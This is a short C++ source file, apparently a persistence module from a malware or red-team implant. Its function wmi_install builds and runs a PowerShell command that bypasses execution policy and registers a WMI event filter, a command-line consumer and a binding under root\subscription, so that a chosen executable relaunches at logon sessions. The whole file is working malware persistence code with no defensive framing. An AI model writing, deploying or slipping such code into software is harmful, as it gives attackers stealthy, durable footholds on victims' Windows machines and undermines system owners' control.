#include "persistence.hpp"

static std::string escape_path(const std::string& path)
{
    std::string out;
    size_t i = 0;

    while (i < path.size())
    {
        if (path[i] == '\\')
            out += "\\\\";
        else
            out += path[i];
        i++;
    }
    return out;
}

bool wmi_install(const std::string& path)
{
    std::string safe = escape_path(path);

    std::string cmd =
        "powershell -ExecutionPolicy Bypass -Command \""
        "$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{"
        "Name='PersistFilter';"
        "EventNamespace='root\\cimv2';"
        "QueryLanguage='WQL';"
        "Query='SELECT * FROM Win32_LogonSession'};"
        
        "$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{"
        "Name='PersistConsumer';"
        "CommandLineTemplate='" + safe + "'};"
        
        "Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{"
        "Filter=$Filter;"
        "Consumer=$Consumer}\"";

    int res = system(cmd.c_str());

    return (res == 0);
}